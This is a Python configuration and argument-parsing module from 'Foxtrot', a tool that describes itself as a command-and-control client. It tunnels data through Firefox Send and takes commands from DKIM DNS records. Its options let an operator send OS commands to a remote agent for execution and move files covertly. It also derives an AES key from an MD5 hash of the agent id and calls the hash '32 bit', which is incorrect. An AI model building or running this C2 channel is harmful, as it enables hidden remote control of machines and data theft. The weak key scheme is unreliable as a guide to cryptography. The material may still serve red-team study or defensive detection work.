import argparse
import hashlib
import logging


class HelpAction(argparse._HelpAction):

    def __call__(self, parser, namespace, values, option_string=None):
        parser.print_help()

        # retrieve subparsers from parser
        subparsers_actions = [
            action for action in parser._actions
            if isinstance(action, argparse._SubParsersAction)]

        # there will probably only be one subparser_action,
        # but better safe than sorry
        for subparsers_action in subparsers_actions:

            # get all subparsers and print help
            for choice, subparser in subparsers_action.choices.items():
                print("\n<ACTION:  '{}'>".format(choice))
                print(subparser.format_help())

        parser.exit()


class Configurator:
    config = {}
    logger = None

    @staticmethod
    def parseArgs():

        parser = argparse.ArgumentParser(
                formatter_class=argparse.RawTextHelpFormatter,
                description="""
                
                C&C Client to shuttle data over Firefox Send service,  \n
                with help from DNS facilities over DKIM records. \n

                Data Channel: Firefox Send  service. 
                Ephemeral Links, Limits on number of download or expiration threshold (24h)
                Command Channel: DKIM records keyed off the agent id. 
                More information https://github.com/dsnezhkov/foxtrot/wiki 
                    -OR- 
                `foxtrot.py --help` for Help 
                """,
                add_help=False
                )

        parser.add_argument('--help', action=HelpAction, help='Foxtrot Help')

        subparsers = parser.add_subparsers()
        subparsers.title = 'Actions'
        subparsers.description = 'valid actions'
        subparsers.help = 'Valid actions: send|recv'
        subparsers.required = True
        subparsers.dest = 'action'
        subparsers.metavar = "<action: send|recv|console|agent> [action options]"

        subparser_send = subparsers.add_parser('send')
        subparser_recv = subparsers.add_parser('recv')
        subparser_con = subparsers.add_parser('console')
        subparser_agent = subparsers.add_parser('agent')

        # Always required options
        orequired = parser.add_argument_group('Required parameters')
        orequired.add_argument('--agent', nargs='?', help='Agent id', required=True)
        orequired.add_argument('--tsigname', nargs='?', help='TSIG name and Key', required=True)
        orequired.add_argument('--tsigrdata', nargs='?', type=argparse.FileType('r'),
                               help='TSIG data file', required=True)
        orequired.add_argument('--nserver', nargs='?', help='Name Server IP', required=True)
        orequired.add_argument('--domain', nargs='?', help='Domain', required=True)

        # FFSend endpoint (production)
        parser.add_argument('--ffservice', default='https://send.firefox.com/')

        # Set verbosity of operation
        parser.add_argument('--verbose', choices=['info', 'debug'],
                            help='Verbosity level. Default: info', default='info')

        # Set verbosity of operation
        parser.add_argument('--role', choices=['master', 'slave'],
                            help='Role of the agent.', default='slave', required=True)

        # Agent options
        subparser_agent.add_argument('--operation',
                                     choices=[
                                         'generate', 'delete', 'reset',
                                         'ident', 'show', 'peek', 'post'],
                                     help='''
                                         generate: generate agent record entry; 
                                         delete: delete agent record entry;  
                                         reset: reset agent record entry to defaults;
                                         show: show DNS record;
                                         peek: peek at job data in the DNS record; 
                                         post: post request for agent, post response from the agent;
                                         ident: identify agent record ''',
                                     required=True)

        subparser_agent.add_argument('--interval_low', nargs='?',  type=int, default=0,
                                     help='Check DNS record every (#)seconds (lower), set to 0 if only once')
        subparser_agent.add_argument('--interval_high', nargs='?',  type=int, default=0,
                                     help='Check DNS record every (#)seconds (high), set to 0 if only once')

        # Send file options
        subparser_send.add_argument('--operation',
                                    choices=['dfile', 'ocmd', 'mcmd'],
                                    help='''
                                         dfile: send data file for download as data;
                                         ocmd: send command instruction for execution be agent,
                                         mcmd: send internal command instruction for agent''',
                                    required=True)
        subparser_send.add_argument('--dfpath', nargs='?', type=argparse.FileType('rb'),
                                    help='dfpath: Path to readable data file')
        subparser_send.add_argument('--ocmd', help='OS command to send')
        subparser_send.add_argument('--ofpath', nargs='?', type=argparse.FileType('rb'),
                                    help='ofpath: Path to readable os commands file')
        subparser_send.add_argument('--mcmd', help='Internal command to send')

        # Recv file options
        # subparser_recv.add_argument('--cache', nargs='?', default="cache",
        #                           help='path to directory to store results')

        args = parser.parse_args()

        # Save and set arguments
        Configurator.config['args'] = args

        Configurator.config['agent'] = args.agent.encode()
        Configurator.config['domain'] = args.domain
        Configurator.config['ttl'] = 60
         
        Configurator.config['nssrv'] = args.nserver
        Configurator.config['tsigname'] = args.tsigname 
        Configurator.config['tsigrdata'] = args.tsigrdata.read().strip()
        Configurator.config['tsig'] = {Configurator.config['tsigname']: Configurator.config['tsigrdata']}
        Configurator.config['service'] = args.ffservice
        Configurator.config['verbose'] = args.verbose
        Configurator.config['role'] = args.role

        Configurator.logger = logging.getLogger('foxtrot')
        logging.basicConfig(
                format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p %Z',
                level=eval("logging.{0}".format(Configurator.config['verbose'].upper())))

        # Create Agent's ID. MD5 generates 32 bit key length used to feed into AES  as key
        # Can use anything else as long as it's in 16, 32 increments (usable for for AES).
        # At the same time DNS labels limit is < 64 so e.g. sha256 will be overly long
        Configurator.config['key'] = hashlib.md5(Configurator.config['agent']).hexdigest()

    @staticmethod
    def getLogger():
        return Configurator.logger

    @staticmethod
    def getConfig():
        return Configurator.config

    @staticmethod
    def printConfig():
        for c in Configurator.config:
            Configurator.logger.debug("CONF: {0}: {1}".format(c, Configurator.config[c]))

